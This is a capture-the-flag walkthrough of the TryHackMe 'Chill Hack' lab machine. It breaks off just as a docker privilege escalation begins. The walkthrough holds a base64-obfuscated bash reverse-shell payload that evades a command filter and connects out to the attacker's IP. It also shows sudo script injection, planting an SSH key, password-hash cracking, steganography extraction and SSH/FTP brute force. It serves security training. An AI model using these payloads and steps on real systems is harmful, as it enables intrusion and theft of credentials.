# Chill Hack

URL: https://tryhackme.com/room/chillhack



Level: Easy



Start time: 1 January 2021, 8:13pm GMT+1


End time: 2 January 2021, 2:15pm GMT+1


Actual play time: 4 hours 26 minutes


## Walkthrough

### Enumeration


#### NMAP


Let's start with a basic nmap scan:

```
# Nmap 7.91 scan initiated Sat Jan  1 20:12:21 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.183.96
Nmap scan report for 10.10.183.96
Host is up (0.059s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sat Jan  1 20:13:12 2022 -- 1 IP address (1 host up) scanned in 50.68 seconds
```

We got 3 open ports. Let's check again with service detection (-sV) and default script (-sC):

```
# Nmap 7.91 scan initiated Sat Jan  1 20:13:58 2022 as: nmap -T4 -p21,22,80 -sV -sC -oN 02_nmap 10.10.183.96
Nmap scan report for 10.10.183.96
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.147.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  1 20:14:21 2022 -- 1 IP address (1 host up) scanned in 22.55 seconds
```

According to Apache and OpenSSH version, chances are we are facing an Ubuntu "bionic" 18.04 LTS box:

https://packages.ubuntu.com/search?keywords=apache2


https://packages.ubuntu.com/search?keywords=openssh


#### FTP

Since we see that anonymous FTP is allowed, we grab the note.txt file:

```
# ftp 10.10.183.96
Connected to 10.10.183.96.
220 (vsFTPd 3.0.3)
Name (10.10.183.96:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (122.4103 kB/s)
ftp> quit
221 Goodbye.


# cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

We got a note from Anurodh about some strings filtering mechanism in action. We will see it soon. 


#### HTTP


We check target with our browser:

![chillhack1](https://user-images.githubusercontent.com/42389836/147879826-f1fafa42-e605-456b-a890-3bc76d04100b.png)


"Login" and "Register" buttons aren't working, and we see some "Lorem Ipsum" stuff here and there, so we fire up our gobuster:


```gobuster dir -u http://10.10.183.96 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o 04_gobuster```

We got some results:


```/images               (Status: 301) [Size: 313] [--> http://10.10.183.96/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.183.96/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.183.96/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.183.96/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://10.10.183.96/secret/]
/server-status        (Status: 403) [Size: 277]
```

We open /secret folder and we found a very simple form:


![chillhack2](https://user-images.githubusercontent.com/42389836/147880283-bb625692-cfed-4f7a-a4d4-646cc567dc2e.png)


Let's take a look on HTML source code:


![chillhack3](https://user-images.githubusercontent.com/42389836/147880303-6d4da8a1-1dd1-45bb-9df9-f038cd2e50e0.png)


Let's try if command execution is actually working (id):


![chillhack4](https://user-images.githubusercontent.com/42389836/147880333-39f871e2-9fee-4b8b-8823-1322e2ced624.png)


We got a response, and we know now that webserver is running as www-data user.


Let's try with a different command (ls):


![chillhack5](https://user-images.githubusercontent.com/42389836/147880354-7f9f1a4f-d707-46e0-96e9-e229b8a0e768.png)


This time we got no luck, we are facing some "string filtering" as stated before.


Since our goal is to get a reverse shell, we must find a way to evade that protection.


Meanwhile, we can also use curl to explore some other command:


```
# curl -X POST http://10.10.94.161/secret/index.php -d 'command=uname -ar'
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
</h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        </body>
</html>
```

Let's obtain a more clean results:


```
# curl -s -X POST http://10.10.94.161/secret/index.php -d 'command=uname -ar' |grep color | awk -F '>' '{ print $2 }'
Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

We found 3 potential system users with "dir" command (we know that "ls" is avoided):


```
# curl -s -X POST http://10.10.94.161/secret/index.php -d 'command=dir /home' |grep color | awk -F '>' '{ print $2 }'
anurodh  apaar  aurick
```


To evade filtering, We try the very first technique on this URL:


https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions


```
# echo "echo $(echo 'bash -i >& /dev/tcp/10.8.147.132/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNDRMakUwTnk0eE16SXZORFEwTkNBd1BpWXhD
Zz09Cg==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```


Then, we run nc on out attacking box:


```
# nc -nlvp 4444
listening on [any] 4444 ...
```


After this, we try again with our curl POST request:


```
# curl -X POST http://10.10.123.185/secret/index.php -d 'command=echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNDRMakUwTnk0eE16SXZORFEwTkNBd1BpWXhDZz09Cg==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h'
```


And we get a shell!


```
connect to [10.8.147.132] from (UNKNOWN) [10.10.94.161] 57314
bash: cannot set terminal process group (1049): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/secret$
www-data@ubuntu:/var/www/html/secret$
www-data@ubuntu:/var/www/html/secret$
www-data@ubuntu:/var/www/html/secret$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


Let's upgrade to a more stable shell:


```
www-data@ubuntu:/var/www/html/secret$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/secret$

```


User flag isn't there:

```
www-data@ubuntu:/var/www/html/secret$ ls
ls
images  index.php
```


So we must look on other home directories:


```
www-data@ubuntu:/var/www/html/secret$ ls -R /home
ls -R /home
/home:
anurodh  apaar  aurick
ls: cannot open directory '/home/anurodh': Permission denied

/home/apaar:
local.txt
ls: cannot open directory '/home/aurick': Permission denied
```

We are only allowed to explore apaar's home, let's move there:


```www-data@ubuntu:/var/www/html/secret$ cd /home/apaar
cd /home/apaar
www-data@ubuntu:/home/apaar$ cat local.txt
cat local.txt
cat: local.txt: Permission denied
```

We have no permission to open local.txt file.


Let's try if there is some sudo permission:


```
www-data@ubuntu:/home/apaar$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Ok, we can run /home/apaar/.helpline.sh as apaar user; let's check that file:


```
www-data@ubuntu:/home/apaar$ cat /home/apaar/.helpline.sh
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

Let's try to actually run it:


```
www-data@ubuntu:/home/apaar$ sudo -S -u apaar /home/apaar/.helpline.sh
sudo -S -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: God
God
Hello user! I am God,  Please enter your message: Happy new year
Happy new year
Thank you for your precious time!
```

As we can see, we could inject some code in $msg variable. Let's try with bash:


```
www-data@ubuntu:/home/apaar$ sudo -S -u apaar /home/apaar/.helpline.sh
sudo -S -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: God
God
Hello user! I am God,  Please enter your message: /bin/bash
/bin/bash
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

Ok, we are now apaar user.


Let's upgrade our shell:


```
python3 -c 'import pty; pty.spawn("/bin/bash")'
apaar@ubuntu:~$ id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
apaar@ubuntu:~$ ls
ls
local.txt
apaar@ubuntu:~$ cat local.txt
cat local.txt
{USER-FLAG: e8[....................]}
```

To be more comfortable with our shell, let's generate an SSH keypairs:


```
# ssh-keygen -f ./chillhack
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./chillhack
Your public key has been saved in ./chillhack.pub
The key fingerprint is:
SHA256:TSADaC4wTm2bXEhFA8MtYZ2S7LJujzrcXFm2JylDKeg root@kali
The key's randomart image is:
+---[RSA 3072]----+
|  =B@=+ .        |
|o.+X.=.o .       |
|++= * .   .      |
|.+.* o o o       |
|..o o + S .      |
| E   = + .       |
|o o . o o        |
|.+.o             |
|+o..             |
+----[SHA256]-----+


# cat chillhack.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYI0pKoPdhlElJqaJGviyqUhA6db1aaGFpjJTcziMZvHVt86fvFyZqsl+ppbBil9CQGe8lyD7j79ZQhkiHZQU/tiPxyDVPlfE7ZiKVRkFUWgM5vzf2m8SkPSNJD7TUVac/eZVQ0CWA8i1aSCguwGuodYrVtrtCQBZjBe9BuzYaVeR0hggPWflJtyGoSqbbF4uPMBP1TK2sV3CmjIkG5O1brU7Z1kq4oXcEHk5EOEXIrjFJNRBYU2wMd6owlR7Zz3BE1nggaNe3CodxWhufuh1A+PcVwMbvQPdXAbJa3xwaywzoUdYl5LiBZ1uqj5pQpdSvBSPTu7OA5/s0BhYb3iZol1McqpiYfhJ+g+n6VJ92wnt3NwN9Yv+sbg1lMGAuf87WO48GY6c6EyCrAndsQl6iKJLQmcJ5F03IaQBfoZTdrk++VOcDwjgPszjhvZN5ZXAn9akUQ+z4zqpuaEtRnvCJQk9stoRayTHixflb7FvcjvtS3M4asxAx9YmMccjumLM= root@kali


```


Let's add our public key to authorized keys file:


```
apaar@ubuntu:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYI0pKoPdhlElJqaJGviyqUhA6db1aaGFpjJTcziMZvHVt86fvFyZqsl+ppbBil9CQGe8lyD7j79ZQhkiHZQU/tiPxyDVPlfE7ZiKVRkFUWgM5vzf2m8SkPSNJD7TUVac/eZVQ0CWA8i1aSCguwGuodYrVtrtCQBZjBe9BuzYaVeR0hggPWflJtyGoSqbbF4uPMBP1TK2sV3CmjIkG5O1brU7Z1kq4oXcEHk5EOEXIrjFJNRBYU2wMd6owlR7Zz3BE1nggaNe3CodxWhufuh1A+PcVwMbvQPdXAbJa3xwaywzoUdYl5LiBZ1uqj5pQpdSvBSPTu7OA5/s0BhYb3iZol1McqpiYfhJ+g+n6VJ92wnt3NwN9Yv+sbg1lMGAuf87WO48GY6c6EyCrAndsQl6iKJLQmcJ5F03IaQBfoZTdrk++VOcDwjgPszjhvZN5ZXAn9akUQ+z4zqpuaEtRnvCJQk9stoRayTHixflb7FvcjvtS3M4asxAx9YmMccjumLM= root@kali" >> .ssh/authorized_keys
<sxAx9YmMccjumLM= root@kali" >> .ssh/authorized_keys
```


Let's access through SSH:


```
# ssh -i chillhack apaar@10.10.94.161
The authenticity of host '10.10.94.161 (10.10.94.161)' can't be established.
ECDSA key fingerprint is SHA256:ybdflPQMn6OfMBIxgwN4h00kin8TEPN7r8NYtmsx3c8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.94.161' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan  2 16:15:11 UTC 2022

  System load:  0.0                Processes:              113
  Usage of /:   24.8% of 18.57GB   Users logged in:        0
  Memory usage: 20%                IP address for eth0:    10.10.94.161
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.


Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
```


Now it's time to...



### Privilege escalation


Let's enumerate "from inside":


```
apaar@ubuntu:~$ sudo -l
Matching Defaults entries for apaar on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User apaar may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
apaar@ubuntu:~$ crontab -l
no crontab for apaar
```

Nothing new here. Let's try with netstat:


```
apaar@ubuntu:~$ netstat -natlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 10.10.94.161:57314      10.8.147.132:4444       CLOSE_WAIT  -
tcp        0    612 10.10.94.161:22         10.8.147.132:37606      ESTABLISHED -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       1      0 10.10.94.161:80         10.8.147.132:40028      CLOSE_WAIT  -
```


This sounds interesting! We got 3 more ports (53/TCP, 3306/tcp, 9001/TCP) since our initial scan, only listening on localhost.



Let's check which service is listening on port 9001:

```
apaar@ubuntu:~$ nc 127.0.0.1 9001

HTTP/1.1 400 Bad Request
Date: Sun, 02 Jan 2022 16:26:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 303
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 9001</address>
</body></html>

```

We got another webserver. In order to navigate from our attacking box, let's use SSH tunneling:


```
# ssh -i chillhack -L 9001:localhost:9001 apaar@10.10.94.161
```


Now we can explore webserver on our box:




![chillhack6](https://user-images.githubusercontent.com/42389836/147882495-770dd90b-1130-44de-8ab7-25519a5b4795.png)



![chillhack7](https://user-images.githubusercontent.com/42389836/147882539-e0692ea0-90ba-46a4-96b5-d09ea660cd3e.png)



We got a simple login form.


By looking in default Apache folder, we found a "files" directory:


```
apaar@ubuntu:~$ cd /var/www/
apaar@ubuntu:/var/www$ ls
files  html
apaar@ubuntu:/var/www$ cd files/
apaar@ubuntu:/var/www/files$ ls
account.php  hacker.php  images  index.php  style.css
```


This is document root of our login form:


```
apaar@ubuntu:/var/www/files$ cat index.php
<html>
<body>
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","XX[REDACTED]");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
        }
?>
<link rel="stylesheet" type="text/css" href="style.css">
        <div class="signInContainer">
                <div class="column">
                        <div class="header">
                                <h2 style="color:blue;">Customer Portal</h2>
                                <h3 style="color:green;">Log In<h3>
                        </div>
                        <form method="POST">
                                <?php echo $success?>
                                <input type="text" name="username" id="username" placeholder="Username" required>
                                <input type="password" name="password" id="password" placeholder="Password" required>
                                <input type="submit" name="submit" value="Submit">
                        </form>
                </div>
        </div>
</body>
</html>
```


Since we got MySQL root password, let's explore database:


```
apaar@ubuntu:/var/www/files$ mysql -uroot -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql>
```

Let's move to webporal database:


```
mysql> use webportal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql>
```


We just got one table; let's explore his content:


```
mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f11[.......] |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e5[.......] |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```

"password" field looks definitely MD5, so let's try to crack them with hashcat:


```
# cat > 19_hashes
7e53614ced3640d5de23f11[.......]
686216240e5af30df0501e5[.......]
```


```
# hashcat -m 0 -a 0 -o cracked_hashes.txt 19_hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2884/2948 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385


Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 19_hashes
Time.Started.....: Sun Jan  2 00:40:35 2022 (5 secs)
Time.Estimated...: Sun Jan  2 00:40:40 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1243.1 kH/s (0.45ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests
Progress.........: 5736448/14344385 (39.99%)
Rejected.........: 0/5736448 (0.00%)
Restore.Point....: 5734400/14344385 (39.98%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: maston420 -> masta619

Started: Sun Jan  2 00:39:10 2022
Stopped: Sun Jan  2 00:40:41 2022
root@kali:/opt/TryHackMe/chillhack# cat cracked_hashes.txt
7e53614ced3640d5de23f11[.......]:dontask[......]
686216240e5af30df0501e5[.......]:master[......]
```


We then try if these new credentials are valid for SSH/FTP access:


```
root@kali:/opt/TryHackMe/chillhack# cat userlist
anurodh
apaar
aurick
```


```
# hydra -L userlist -P passlist ssh://10.10.110.120

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 00:44:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:3/p:2), ~1 try per task
[DATA] attacking ssh://10.10.110.120:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 00:44:46
```

```
root@kali:/opt/TryHackMe/chillhack# hydra -L userlist -P passlist ftp://10.10.110.120
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 00:44:52
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:3/p:2), ~1 try per task
[DATA] attacking ftp://10.10.110.120:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 00:44:56
```


No luck.


By the way, we are now able to authtenticate to login form:



![chillhack8](https://user-images.githubusercontent.com/42389836/147883276-b822ae93-69d9-4128-8cc8-db190f744b0b.png)


![chillhack9](https://user-images.githubusercontent.com/42389836/147883292-3ea54f38-5c50-4ac8-8c75-6483f01f8045.png)


It seems we got this static web page with no other resources.
Since we read that we must "look in the dark", there is a suggestion about some steganographic technique.


Let's download the jpg file and check with steghide tool:


```
# steghide info hacker-with-laptop_23-2147985341.jpg
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```


There is a zip archive inside the jpg image.


Let's extract it:


```
# stegseek --crack hacker-with-laptop_23-2147985341.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "backup.zip".
[i] Extracting to "hacker-with-laptop_23-2147985341.jpg.out".

root@kaligra:/home/joshua# file hacker-with-laptop_23-2147985341.jpg.out
hacker-with-laptop_23-2147985341.jpg.out: Zip archive data, at least v2.0 to extract



root@kaligra:/home/joshua# unzip hacker-with-laptop_23-2147985341.jpg.out
Archive:  hacker-with-laptop_23-2147985341.jpg.out
[hacker-with-laptop_23-2147985341.jpg.out] source_code.php password:
   skipping: source_code.php         incorrect password
```

We must find password for that zip file.


Let's use john2zip:


```
# zip2john hacker-with-laptop_23-2147985341.jpg.out > toCrack
ver 2.0 efh 5455 efh 7875 hacker-with-laptop_23-2147985341.jpg.out/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
root@kali:/opt/TryHackMe/chillhack# cat toCrack
hacker-with-laptop_23-2147985341.jpg.out/source_code.php:$pkzip2$1*2*2*0*22a*4bb*69dc82f3*0*49*8*22a*69dc*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip2$:source_code.php:hacker-with-laptop_23-2147985341.jpg.out::hacker-with-laptop_23-2147985341.jpg.out
```

And then run john again with "rockyou" wordlist:


```
# john --wordlist=/usr/share/wordlists/rockyou.txt toCrack
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (hacker-with-laptop_23-2147985341.jpg.out/source_code.php)
1g 0:00:00:00 DONE (2022-01-02 11:41) 16.66g/s 204800p/s 204800c/s 204800C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


Now we are able to look at source_code.php file:


```
# unzip hacker-with-laptop_23-2147985341.jpg.out
Archive:  hacker-with-laptop_23-2147985341.jpg.out
[hacker-with-laptop_23-2147985341.jpg.out] source_code.php password:
replace source_code.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: source_code.php
```


```
root@kali:/opt/TryHackMe/chillhack# cat source_code.php
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit">
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQw[............]dzByZA==")
                {
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```


We found a string which looks like base64 encoded. Let's try:


```
# echo -n "IWQw[............]dzByZA==" | base64 -d
!d0n[.......]sw0rd
```


Let's try SSH access with that password:


```
# ssh anurodh@10.10.94.161
anurodh@10.10.94.161's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan  2 17:11:04 UTC 2022

  System load:  0.0                Processes:              119
  Usage of /:   24.9% of 18.57GB   Users logged in:        1
  Memory usage: 21%                IP address for eth0:    10.10.94.161
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc//copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

```

We are in!


We noticed that anurodh is member of docker group:


```
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

According to that URL:

https://flast101.github.io/docker-privesc/


We can try to obtain privesc by using docker, let's try:


```
anurodh@ubuntu:~$ cat > docker.sh
#!/bin/bash

